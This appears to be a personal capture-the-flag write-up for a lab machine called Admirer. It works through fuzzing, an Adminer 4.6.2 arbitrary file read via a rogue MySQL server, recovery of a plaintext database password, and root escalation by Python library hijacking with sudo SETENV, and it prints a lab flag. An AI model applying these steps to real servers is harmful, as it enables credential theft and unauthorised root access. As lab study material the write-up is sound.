#### Admin_Task and Utility Scripts 

```url
http://10.129.229.101/utility-scripts/admin_tasks.php
```
-> Allows us to run admin tasks. 

```shell
ffuf -w ~/Documents/SecLists/Discovery/Web-Content/directory-list-2.3-small.txt:FUZZ -u http://admirer.htb/utility-scripts/FUZZ.php  
```

```shell
ffuf -w ~/Documents/SecLists/Discovery/Web-Content/raft-large-words-lowercase.txt:FUZZ -u http://admirer.htb/utility-scripts/FUZZ.php
```

this fuzz also gives us a php file in the folder.
`https://www.adminer.htb.com/utility-scripts/adminer.php`

Dis gives us a login platform. The passwords from the standard db do not work.

### Adminer 
For `adminer 4.6.2` there is a file read vulnerability. 

https://podalirius.net/en/articles/writing-an-exploit-for-adminer-4.6.2-arbitrary-file-read-vulnerability/

### Exoploit Perperation  
#### Not Working 
```shell
docker run --name='my_sql_container' -d -p 3306:3306 mysql/mysql-server
docker logs my_sql_container -> Read passowrd 

docker exec -it my_sql_container bash
cd /var/lib/mysql
mysql -u root -p
ALTER USER 'root'@'localhost' IDENTIFIED BY 'password';
```
![](Admirer.png)

After a few changes i got the following error... at the moment i do not know how to fix it. 
`The server requested authentication method unknown to the client`

-> It seems like the server is not allowed to connect to other mysql instances and therefor no exploit is possible.

 After looking at the hint it described this vulnerability... 

I can fix this by creating a User: `user` with password `password`-
```sql
CREATE USER 'user'@'%' IDENTIFIED BY 'password';
GRANT ALL PRIVILEGES ON *.* TO 'user'@'%' WITH GRANT OPTION;
FLUSH PRIVILEGES;
```
GRANT ALL PRIVILEGES ON *.* TO 'root'@'%' IDENTIFIED BY 'your_password' WITH GRANT OPTION;
FLUSH PRIVILEGES;


Then i get an other error `The server requested authentication method unknown to the client`. 

```sql
Select user, host, plugin from mysql.user where user = "user";

ALTER USER 'user'@'%' IDENTIFIED WITH 'mysql_native_password' BY 'password';
FLUSH PRIVILEGES;

Select user, host, plugin from mysql.user where user = "user";
```


#### Working way

> [!Warning]
> I used ippsec video on this, because i was broken...

```shell
sudo service mysql start 

sudo mysql -u root 
```

```SQL
Create Database deleteMe;

create user 'alex'@'10.129.229.101' identified by 'helpme';

grant all on deleteMe.* to 'alex'@'10.129.229.101';

Flush Privileges; 

```
![](Pasted image 20250129084819.png)

This error stems as the connection is not allowed to be access publicy. In fix this we need to run this: 

```shell
socat TCP-LISTEN:3306,fork,bind=10.10.14.3 TCP:127.0.0.1:3306
```
This `socat` command sets up a TCP listener on IP 10.10.14.3, port 3306 (MySQL default port). When a connection is received, it forks a new process to handle it and forwards traffic to localhost (127.0.0.1), port 3306.

Then we get an other Error, which we need to change the bind address from 127.0.0.1 to all adresses 0.0.0.0.
```
cd /etc/mysql

grep -R 127.0.0.1                                                     
```
Which gets us: `mariadb.conf.d/50-server.cnf:bind-address            = 127.0.0.1`.

then we need to change this. 
```
 grep -R 0.0.0.0  
```
`mariadb.conf.d/50-server.cnf:bind-address            = 0.0.0.0`
now if we reboot the system it should work.  We are able to access the system. 

Before we can exploit it. This is a arbitrary file read vulnerabilty. Meaning we can load a file from the system into the sql statement.  
For this we need to create a table. 

```sql
Create TABLE exploit (OUTPUT TEXT (4096))
```

```sql
LOAD DATA local INFILE '/etc/passwd' INTO TABLE exploit fields TERMINATED BY "\n";
```

![](Pasted image 20250129091704.png)
This is a restriciton by PHP. We need to find something accessible by PHP. So we can use the `utility-scripts/info.php` and see that the `open_basdir` is `var/www/html` and we know from the backup we dumped that there may be a `index.php` file with the credentials of the waldo user.  So we trie to load the `index.php`.

```sql
LOAD DATA local INFILE '/var/www/html/index.php' INTO TABLE exploit fields TERMINATED BY "\n";
```
Now if we seletect the table we see the loaded files with credentials in it. 

```
$servername = "localhost";
 edit	                        $username = "waldo";
 edit	                        $password = "&<h5b~yK3F#{PaPB&dA}{H>";
```


> [!Success] Credentials Waldo 
> User: `waldo` 
> Credential: `&<h5b~yK3F#{PaPB&dA}{H>`

## Post-Exploitation
### 4.1 Gaining Shell
- **Tools Used:** ssh, adminer
- **Commands:**: 

We cann connect to ssh and adminer with the credentials of the user waldo.

First we get the user flag: `58436a9fdc84ff13607ac64df1a1caad`

### 4.2 Enumeration on Shell

## Privilege-Escalation
### 5.1 Enumeration for PE
- **Techniques Used:** internet, #python, Python Library Hijacking
- **Commands/Tools:**
```shell
sudo -l
```
Got us a interesting file: `(ALL) SETENV: /opt/scripts/admin_tasks.sh`

I dumped this file by running a imple Python Webserver on the victim and then downloaded it with my attack machine. 


while searching and going through they privileges escalation checklist by hacktricks. I saw SETENV which showed an example from admirer that the pythonpath enviorment variable could be used to exploit this. However not how. After searching a bit i found the following article: 
https://medium.com/analytics-vidhya/python-library-hijacking-on-linux-with-examples-a31e6a9860c8


---

### 5.2 Gaining Root/Privileged Access
- **Exploit/Payload:**
- **Steps:**

This shows that a Pythonpath vulnerability is being exploited.
But how?

If we look at the backup.py file, we see that it imports make_archive from shutil.py. So we search for it and find it under /user/lib/python3.5/.

The first exploit is the SETENV, which we can set with sudo for this script. The problem here is that we can change the PYTHONAPTH with SETENV. The PYTHONPATH environment specifies which Python environment should be used. And because we can set it, we can change the environment to one that we control, which allows us to customize the things that happen.

So first we copy the directory to our home directory.

```
cp /usr/lib/python3.5/ /home/waldo/. -r
```
Then we search shutil.py and in it the `make_archive` function. Whatever we put in here will be executed if we redirect the enviorment to our own.  

So we can change it to get a shell or the flag or whatever we want. 
and then run it. What i put into the script to get the flag. 

```python
os.system('whoami')
os.system('ls -l /root/')
os.system('cat /root/root.txt')
```

```shell
sudo PYTHONPATH=/home/waldo/python3.5 /opt/scripts/admin_tasks.sh 
```
And then we of course need to select 6 to backup the web because otherwise the python will not be loaded.
